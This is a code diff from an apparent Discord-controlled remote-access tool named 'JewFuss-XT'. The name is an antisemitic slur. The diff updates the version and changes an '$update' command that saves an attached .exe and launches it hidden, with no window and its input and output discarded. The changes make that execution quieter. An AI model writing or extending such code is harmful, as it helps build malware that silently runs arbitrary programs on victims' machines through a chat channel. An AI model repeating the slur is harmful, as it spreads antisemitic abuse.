@@ -46,7 +46,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.1" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.2" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -72,19 +72,19 @@ async def fm_reply(ctx, content: str, alt_content: str = None, filename: str = "
 
 commands.Context.fm_send = fm_send
 commands.Context.fm_reply = fm_reply
-        
+
 @bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)", usage="$update")
 async def update(ctx):
     if not ctx.author.guild_permissions.administrator:
-        await ctx.send("You don't have permission to access this command.", ephemeral=True)
+        await ctx.send("You don't have permission to access this command.")
         return
     if not ctx.message.attachments:
-        await ctx.send("No file attached. Please attach a `.exe` file.", ephemeral=True)
+        await ctx.send("No file attached. Please attach a `.exe` file.")
         return
 
     attachment = ctx.message.attachments[0]
     if not attachment.filename.lower().endswith(".exe"):
-        await ctx.send("Attached file must be a `.exe`.", ephemeral=True)
+        await ctx.send("Attached file must be a `.exe`.")
         return
 
     try:
@@ -92,8 +92,21 @@ async def update(ctx):
         await attachment.save(save_path)
 
         prevpath = os.path.abspath(sys.argv[0])
-        creationflags = 0x00000008 | 0x08000000 # DETACHED_PROCESS | CREATE_NO_WINDOW
-        subprocess.Popen([save_path, f"--prevpath={prevpath}"], creationflags=creationflags, close_fds=True)
+        
+        creationflags = (0x08000000 | 0x00000200)
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        si.wShowWindow = 0
+        subprocess.Popen(
+            [save_path, f"--prevpath={prevpath}"],
+            creationflags=creationflags,
+            startupinfo=si,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            close_fds=True,
+            shell=False
+        )
 
         await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
     except Exception as e:
